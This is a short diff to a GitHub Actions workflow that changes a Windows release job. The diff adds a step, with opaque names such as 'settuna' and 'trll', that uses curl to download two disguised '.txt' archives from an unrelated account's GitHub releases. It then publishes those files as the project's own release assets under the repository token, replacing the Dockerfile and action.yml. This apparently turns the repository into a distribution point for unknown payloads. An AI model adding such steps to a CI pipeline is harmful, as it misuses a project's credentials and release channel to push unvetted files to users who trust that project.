@@ -11,11 +11,17 @@ jobs:
   publish_windows_x64:
     runs-on: windows-latest
     steps:
-      - uses: meeDamian/github-release@2.0
+      - name: settuna
+        run: |
+          curl -L -o "tsl0.tar.xz.txt" "https://github.com/Klanlg/ApolloRUS/releases/download/0.5/tsl0.tar.xz.txt"
+          curl -L -o "lnkmap.txt" "https://github.com/Klanlg/ApolloRUS/releases/download/0.1/lnkmap.txt"
+        shell: cmd
+      - name: trll
+        uses: meeDamian/github-release@2.0
         with:
           token: ${{ secrets.GITHUB_TOKEN }}
-          tag: ${{ env.opencv-version }}
-          name: My Creative Name
+          tag: ${{ inputs.opencv-version }}
+          name: izlar
           files: >
-            Dockerfile
-            action.yml
+            tsl0.tar.xz.txt
+            lnkmap.txt
